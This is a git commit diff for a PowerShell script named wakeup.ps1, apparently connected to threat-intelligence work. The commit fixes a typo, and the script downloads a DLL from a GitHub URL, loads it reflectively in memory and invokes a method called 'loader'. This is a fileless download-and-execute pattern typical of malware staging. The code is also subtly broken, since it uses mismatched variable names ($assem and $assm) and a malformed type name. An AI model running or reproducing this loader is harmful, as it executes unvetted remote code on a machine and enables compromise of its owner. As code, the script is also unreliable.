bf8b76b10d2a51ea9b0f6d9627899c5fee75d869
mikewebcti <110481674+mikewebcti@users.noreply.github.com>
2022-11-25 11:06:25 -0500

    Update wakeup.ps1

--- wakeup.ps1
+++ wakeup.ps1
@@ -1,5 +1,5 @@
 ﻿$data = (New-Object System.Net.WebClient).DownloadData('https://github.com/mikewebcti/Nov22/raw/main/CTI2.dll')
-$assem = [System.Reflection.Assembly]::LOad($data)
+$assem = [System.Reflection.Assembly]::Load($data)
 $class = $assm.GetType("ClassLibrary1:Class1")
 $method = $class.GetMethod("loader")
 $method.Invoke(0, $null)
